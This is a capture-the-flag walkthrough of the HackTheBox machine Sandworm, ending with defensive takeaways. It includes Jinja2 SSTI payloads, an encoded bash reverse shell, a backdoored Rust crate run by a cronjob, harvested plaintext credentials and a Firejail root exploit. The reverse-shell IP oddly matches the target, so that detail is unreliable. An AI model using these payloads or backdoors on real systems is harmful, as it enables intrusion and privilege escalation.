---
title: "HTB: Sandworm — SSTI to Root via Rust Crate Hijacking"
date: 2026-06-12
summary: "A walkthrough of HackTheBox Sandworm, demonstrating a PGP-based SSTI foothold, lateral movement through Rust crate hijacking, and privilege escalation via CVE-2022-31214 in Firejail."
tags: ["htb", "web", "ssti", "firejail", "rust", "linux", "medium"]
draft: false
---

Sandworm is a medium-difficulty Linux machine that chains together a handful of techniques you don't see every day: SSTI buried inside a PGP verification workflow, lateral movement via Rust crate hijacking, and privilege escalation through a CVE in Firejail. The box forces you to actually understand what the application is doing before you can exploit it, which makes it a good one.

## Recon

Starting with a targeted Nmap scan:

```bash
$ nmap -p 22,80,443 -sCV 10.129.229.16 -oN Targeted.txt
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH on 22, Nginx on 80 redirecting to HTTPS on 443. The SSL certificate leaks the domain `ssa.htb`, which we add to `/etc/hosts`:

```bash
$ echo "10.129.229.16 ssa.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Browsing to `ssa.htb`, the site presents itself as the Secret Spy Agency, a fictional intelligence organization. The footer reveals the site is powered by Flask, which is worth keeping in mind.

![ssa.htb homepage showing Flask in footer](/img/writeups/sandworm/02-homepage.png)

The Contact page states that only PGP-encrypted tips will be accepted and includes a link to a `/guide` page explaining how to use PGP.

![Contact page with PGP requirement](/img/writeups/sandworm/03-contact.png)

The `/guide` page is a live PGP sandbox with four functions: encrypt a message using the site's public key, decrypt a message using your own key, sign a message, and verify a signed message. Each of these is a separate input surface.

![/guide page with PGP sandbox](/img/writeups/sandworm/04-guide-page.png)

### Setting Up GPG

The site's public key is available at `/pgp`. Save it and import it:

```bash
$ curl -k https://ssa.htb/pgp -o ssa.asc
$ gpg --import ssa.asc
```

```
gpg: key C61D429110B625D4: public key "SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>" imported
gpg: Total number of processed: 1
gpg:               imported: 1
```

The import output reveals the associated email: `atlas@ssa.htb`. Potential username, noted.

### Working Through the PGP Functions

**Verifying SSA's signed message:** The `/guide` page includes a pre-signed message from SSA. Save it to a file and verify it:

```bash
$ gpg --verify signed_message.txt
```

```
gpg: Signature made Thu 04 May 2023 12:13:47 PM EDT
gpg:                using RSA key D6BA9423021A0839CCC6F3C8C61D429110B625D4
gpg: Good signature from "SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>" [unknown]
```


**Encrypting a test message:** To test the decrypt function, encrypt a message with SSA's key and paste the output into the webapp:

```bash
$ echo "test message" | gpg --encrypt --armor -r atlas@ssa.htb --trust-model always
```

![Webapp decrypting the test message successfully](/img/writeups/sandworm/07-decrypt-test.png)

Since the app is running Flask, I tried injecting SSTI payloads into the text fields at this point. Nothing came back. The encrypt/decrypt flow doesn't appear to render user input through the template engine. Moving on to the signing flow.

**Generating my own keypair:**

```bash
$ gpg --batch --gen-key <<EOF
Key-Type: RSA
Key-Length: 4096
Name-Real: testuser
Name-Email: test@test.com
Expire-Date: 0
%no-passphrase
%commit
EOF
```

```
gpg: revocation certificate stored as '/home/tvaughancyber/.gnupg/openpgp-revocs.d/83860A2E27121A198B55A7900378DD14316FEA51.rev'
```

**Signing a message:**

```bash
$ echo "Testing PGP signatures." > message.txt
$ gpg --clearsign message.txt
$ cat message.txt.asc
```

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Testing PGP signatures.
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAd...
-----END PGP SIGNATURE-----
```

**Exporting the public key:**

```bash
$ gpg --armor --export test@test.com
```

```
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQINBGosPY8BEADfZRMe...
-----END PGP PUBLIC KEY BLOCK-----
```

Pasting the signed message and public key into the last two boxes on `/guide` and clicking Verify Signature returns a popup containing the signature details along with the name and email fields from the submitted key.

![Verification popup showing name and email from submitted key](/img/writeups/sandworm/11-verify-popup.png)

That popup is the interesting part. The name and email fields come directly from the submitted public key and are being rendered dynamically. Since Flask uses Jinja2, the question is whether that rendering is sanitized. The other forms returned static responses, but this popup appears to use a different code path.


## Foothold — SSTI via PGP Key Name Field

To test whether the verification popup is vulnerable to SSTI, I generated a new keypair and injected a standard Jinja2 payload into the Name-Real field:

```bash
$ gpg --batch --gen-key <<EOF
Key-Type: RSA
Key-Length: 4096
Name-Real: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
Name-Email: test@test.com
Expire-Date: 0
%no-passphrase
%commit
EOF
```

```
gpg: revocation certificate stored as '/home/tvaughancyber/.gnupg/openpgp-revocs.d/DB8F4BDE650A1474CBCDD3D3F2B5E5CC1672497B.rev'
```

Sign a message with the new key and export its public key using the fingerprint:

```bash
$ gpg --clearsign --local-user DB8F4BDE650A1474CBCDD3D3F2B5E5CC1672497B message.txt
$ gpg --armor --export DB8F4BDE650A1474CBCDD3D3F2B5E5CC1672497B
```

Submitting both to the verify endpoint returned the popup with the output of the `id` command rendered inline with the signature information.

![Verification popup showing id command output — SSTI confirmed](/img/writeups/sandworm/13-ssti-confirmed.png)

SSTI confirmed. The name field is rendered unsafely through Jinja2.

Getting a shell from here is straightforward. Base64-encode a reverse shell to avoid bad characters and embed it in the payload:

```bash
$ gpg --batch --gen-key <<EOF
Key-Type: RSA
Key-Length: 4096
Name-Real: {{request.application.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMjkuMjI5LjE2LzQ0NDQgMD4mMQ== | base64 -d | bash').read()}}
Name-Email: test@test.com
Expire-Date: 0
%no-passphrase
%commit
EOF
```

```
gpg: revocation certificate stored as '/home/tvaughancyber/.gnupg/openpgp-revocs.d/E5DBC824A8F500CE0B34D3AA5CB62BB6F36C2256.rev'
```



Set up a listener, sign a message with the new key, export the public key, and submit both to the verify endpoint:

```bash
$ nc -nvlp 4444
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.229.16 49532
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/var/www/html/SSA$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
```


Shell as `atlas`. Upgraded to a TTY with Python:

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

The reason the name field works when the other inputs didn't comes down to code paths. The signature verification popup pulls the key's metadata and renders it through a Jinja2 template without sanitization. The encrypt/decrypt forms use a different path that doesn't do that. It's a good reminder to test every input surface individually rather than assuming one negative result covers the rest.


## Lateral Movement — Jail Breakout and Credential Discovery

The first thing that stood out after landing the shell was that only a limited subset of bash commands were available. Checking `/proc/1/cmdline` confirmed we were inside a Firejail sandbox:

```bash
atlas@sandworm:~$ cat /proc/1/cmdline
/usr/local/bin/firejail--profile=webappflaskrun
```

Rather than trying to break out immediately, I enumerated the home directory. Inside `atlas`'s config files there was an httpie session file with plaintext credentials:

```bash
atlas@sandworm:~$ cat /home/atlas/.config/httpie/sessions/localhost_5000/admin.json
```

```json
{
    "__meta__": {
        "about": "HTTPie session file",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "username": "silentobserver"
    }
}
```
That got us SSH access as `silentobserver`:
 
```bash
$ ssh silentobserver@ssa.htb
```
 
<pre class="flag-capture"><code>silentobserver@sandworm:~$ id
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
silentobserver@sandworm:~$ cat user.txt
86a7...[REDACTED]...6010
</code></pre>
 


## Lateral Movement — Rust Crate Hijacking

With a stable shell as `silentobserver`, I uploaded `pspy64` to watch for background processes. Every couple of minutes a cronjob fires and runs `cargo` inside `/opt/tipnet` as `atlas`.

A quick background on why this matters: Rust uses a package manager called Cargo to handle project dependencies. Dependencies are defined in `Cargo.toml`. When `cargo run` is executed, Cargo checks dependencies, recompiles if needed, and runs the binary. The key detail is that it recompiles every time, which means any code we inject into a dependency gets executed fresh on each run.

Reading `tipnet`'s `Cargo.toml`:

```bash
silentobserver@sandworm:/opt/tipnet$ cat Cargo.toml
```

```toml
[package]
name = "tipnet"
version = "0.1.0"
edition = "2021"

[dependencies]
chrono = "0.4"
mysql = "23.0.1"
nix = "0.18.0"
logger = {path = "../crates/logger"}
sha2 = "0.9.0"
hex = "0.4.3"
```


The `logger` crate is referenced via a local path rather than the public Cargo registry. Checking permissions on that directory showed `silentobserver` has write access to the crate. Since the cronjob runs `cargo run` as `atlas`, anything we write into the logger crate will be compiled and executed as `atlas` the next time it fires.

I modified `/opt/crates/logger/src/lib.rs` to inject a `pwn()` function that sends a reverse shell and called it at the top of `log()`:

```rust
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    pwn();
    let now = Local::now();
    // rest of original function...
}

fn pwn() {
    Command::new("sh")
        .arg("-c")
        .arg("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMjkuMjI5LjE2LzQ0NDQgMD4mMQ== | base64 -d | bash")
        .output()
        .expect("failed");
}
```


Saved the file, set up a listener on port 4444, and waited. A couple minutes later the cronjob fired:

```
Listening on 0.0.0.0 4444
Connection received on 10.129.229.16 32928
atlas@sandworm:/opt/tipnet$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
```


## Privilege Escalation — CVE-2022-31214 (Firejail)

The `id` output from the new shell immediately stood out: `atlas` is in the `jailer` group. I used `find` to look for anything owned by that group:

```bash
atlas@sandworm:/opt/tipnet$ find / -group jailer 2>/dev/null
/usr/local/bin/firejail
```


The only result was the Firejail binary itself. Checking the version:

```bash
atlas@sandworm:/opt/tipnet$ firejail --version
firejail version 0.9.68
```

Version 0.9.68 is vulnerable to CVE-2022-31214. At a high level, the vulnerability abuses Firejail's `--join` flag by creating a fake sandboxed process with custom user and mount namespaces that Firejail's join logic trusts, which ends up granting full root privileges when a second shell joins it.

The exploit requires two shells running simultaneously. I added my public SSH key to `atlas`'s `authorized_keys` to get a stable second session, then uploaded the [Python PoC](https://www.openwall.com/lists/oss-security/2022/06/08/10/1) (credit: Matthias Gerstner) to `/tmp`:

```bash
atlas@sandworm:/tmp$ ./firejail_poc.py
You can now run 'firejail --join=4709' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

In the second shell:
```bash
atlas@sandworm:~$ firejail --join=4709
changing root to /proc/4709/root
Warning: cleaning all supplementary groups
Child process initialized in 9.04 ms
atlas@sandworm:~$ su -
```

<pre class="flag-capture"><code>root@sandworm:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sandworm:~# cat root.txt
bfce...[REDACTED]...2ebf
</code></pre>

## Takeaways
 
### What this attack chain looks like in real environments
 
Every technique in this chain has a real-world equivalent outside of CTF environments.
 
SSTI vulnerabilities show up anywhere user-controlled data gets passed into a templating engine without sanitization. Flask/Jinja2 is common in internal tooling and smaller web applications where developers may not be aware of the risk. The PGP wrapper here was a good example of how the vulnerability can be hidden behind a layer of legitimate functionality. For example, the encryption and decryption forms on the same page were clean, which might cause a tester to move on too quickly.
 
Dependency hijacking in build pipelines is a real and documented attack class. Supply chain attacks like the npm dependency confusion attacks of the early 2020s follow the exact same logic: if you can write to a package a privileged process compiles and runs, you own that process. In this box the vector was a local file path dependency with weak permissions. In real environments this shows up as misconfigured artifact repositories, writable shared directories in CI/CD pipelines, or developer machines with overly permissive package caches.
 
CVE-2022-31214 in Firejail is a real CVE affecting a sandboxing tool that many Linux users run specifically for security purposes. The irony is that membership in the `jailer` group, which exists to manage Firejail, is what makes the escalation possible. Privilege boundaries introduced for security becoming the path of escalation is a pattern that shows up in container escapes and hypervisor attacks as well.
 
### What a defender could have done
 
**SSTI prevention** *(High).* Never render user-controlled data through a template engine without escaping it first. In Jinja2, the `|e` filter or `autoescape=True` in the environment configuration would have stopped this entirely. User-supplied strings should be treated as data, not as template syntax. A WAF rule filtering on `{{` and `}}` would also catch the most common payloads, though it's not a substitute for fixing the root cause.
 
**Dependency and build pipeline hardening** *(High).* Local path dependencies in Cargo (or any package manager) should be read-only to all users except the service account that owns the build. The `silentobserver` account had no business reason to have write access to a crate that gets compiled and executed by `atlas`. Principle of least privilege applied to the filesystem would have broken this chain at the lateral movement step. In CI/CD environments, pin dependency versions, use lockfiles, and audit write access to any directory that feeds into a build.
 
**Firejail group membership** *(Medium).* The `jailer` group grants a level of trust over the Firejail binary that should be treated as a privileged capability. Membership should be reviewed and restricted the same way you would treat `sudo` access. The CVE has been patched in versions above 0.9.68; keeping sandboxing tools up to date is important precisely because a vulnerability in a security tool can invert the intended protection.
 
**Credential storage** *(Critical).* Plaintext credentials in a session file sitting in a user's home directory is the kind of finding that ends an engagement quickly in a real environment. HTTPie and similar tools store session data to disk by default. Developers and operators should be aware of what their tools are persisting, especially on machines that are accessible to other users or services.
 
### What this exercise reinforced for me
 
Sandworm did a good job of reinforcing that vulnerability enumeration isn't just about running a tool against obvious inputs. The SSTI surface here required actually working through the PGP workflow, understanding what each form did, and recognizing that the verification popup was rendering data differently than the other forms. A checklist approach would have missed it.
 
The Rust crate hijacking was the most novel technique in the chain for me personally. I had a solid understanding of supply chain attacks conceptually but working through it hands-on (reading the source code, understanding the Cargo compilation model, and modifying the crate so it stayed valid while executing a payload) made the underlying concept much more concrete. Understanding *why* `cargo run` is different from running a precompiled binary is the kind of detail that makes the difference between recognizing a finding and missing it.
 
This box also reinforced that privilege escalation paths are often hiding in the things that were put in place for a reason. The Firejail sandbox was there to contain the web app. The `jailer` group was there to manage it. Both became part of the escalation path. That pattern shows up constantly in real environments: security controls that weren't fully thought through become the path forward.